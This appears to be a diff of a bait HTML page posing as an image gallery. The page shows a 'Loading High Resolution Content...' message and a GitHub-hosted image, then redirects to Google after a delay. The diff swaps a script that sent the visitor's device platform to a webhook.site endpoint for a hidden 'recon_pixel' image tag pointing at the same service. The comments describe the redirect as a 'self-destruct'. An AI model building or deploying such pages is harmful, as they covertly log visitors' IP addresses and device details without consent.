@@ -3,36 +3,20 @@
 <head>
     <title>Image Gallery</title>
 </head>
-<body style="background-color: #000; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh;">
+<body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
+
+    <h2>Loading High Resolution Content...</h2>
+
+    <img src="https://webhook.site/YOUR-UNIQUE-ID-HERE?v=recon_pixel" style="display:none;">
+
+    <img src="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true" style="max-width: 90%; border: 2px solid #333;">
 
     <script>
-        // 1. DATA COLLECTION
-        // Replace with your Webhook.site URL
-        const webhook = "https://webhook.site/YOUR_ID_HERE";
-        const baitImage = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-
-        // Create a "Tracking Pixel" - this forces the browser to hit Webhook.site
-        const tracker = new Image();
-        tracker.src = webhook + "?device=" + encodeURIComponent(navigator.platform) + "&v=recon";
-
-        // 2. THE REDIRECT (Self-Destruct)
-        // We wait 7 seconds: 2 for the data, 5 for the user to see "Loading"
-        tracker.onload = function() {
-            setTimeout(function() {
-                window.location.replace("https://www.google.com");
-            }, 7000);
-        };
-
-        // Fallback: If the tracker fails, redirect anyway after 10s
+        // THE SELF-DESTRUCT: 10 second countdown to Google
         setTimeout(function() {
             window.location.replace("https://www.google.com");
         }, 10000);
     </script>
-
-    <div style="text-align: center;">
-        <p>Loading High Resolution Content...</p>
-        <img src="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true" style="max-width: 80%; border: 1px solid #222;">
-    </div>
 
 </body>
 </html>
